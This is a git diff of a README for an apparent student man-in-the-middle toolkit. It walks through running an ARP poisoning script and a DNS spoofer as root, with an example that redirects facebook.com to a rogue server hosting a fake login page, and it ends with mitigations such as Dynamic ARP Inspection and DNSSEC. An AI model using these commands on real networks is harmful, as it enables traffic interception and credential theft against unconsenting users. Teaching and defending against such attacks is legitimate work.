@@ -28,8 +28,55 @@ This suite is explicitly built to help cybersecurity professionals, penetration 
 This tool requires **Linux** (Kali Linux recommended) for low-level packet manipulation and **Python 3**.
 
 1. Clone this repository:
+
    ```bash
-   git clone [https://github.com/](https://github.com/)[USERNAME_GITHUB_ANDA]/MITM-Tactical-Suite.git
+   git clone [https://github.com/USERNAME_GITHUB_ANDA/MITM-Tactical-Suite.git](https://github.com/USERNAME_GITHUB_ANDA/MITM-Tactical-Suite.git)
    cd MITM-Tactical-Suite
    ```
-# MITM-Tactical-Suite
+
+2. Install required dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+## 🚀 Usage: Kill Chain Simulation
+
+To execute a full MITM redirection attack, you need to run both modules in tandem. Open two separate terminal windows.
+
+Make sure you have `root` privileges (`sudo`), as Scapy requires low-level network socket access.
+
+### Step 1: Establish the MITM Position (Terminal 1)
+
+First, place your machine between the victim and the gateway using the ARP module.
+
+```bash
+chmod +x arppoison.py
+sudo ./arppoison.py -t <VICTIM_IP> -g <GATEWAY_IP>
+```
+
+_Example:_ `sudo ./arppoison.py -t 192.168.1.10 -g 192.168.1.1`
+
+### Step 2: Execute DNS Hijacking (Terminal 2)
+
+While the ARP script is running, execute the DNS spoofer to redirect a specific domain to your rogue server (e.g., an Apache server hosting a fake login page).
+
+```bash
+chmod +x dns_spoofer.py
+sudo ./dns_spoofer.py -d <TARGET_DOMAIN> -r <ROGUE_IP>
+```
+
+_Example:_ `sudo ./dns_spoofer.py -d facebook.com -r 192.168.1.50`
+
+_(When the victim attempts to browse `facebook.com`, they will be transparently redirected to `192.168.1.50`)_
+
+## 🛡️ Mitigation
+
+To protect networks from this suite, administrators should implement:
+
+- **Dynamic ARP Inspection (DAI)** and DHCP Snooping on enterprise switches.
+- **DNSSEC (Domain Name System Security Extensions)** to validate DNS responses cryptographically.
+- **Static ARP entries** for critical infrastructure components.
+
+---
+
+_Developed by **Haykal Azriel Priatama** as part of Telkom University._
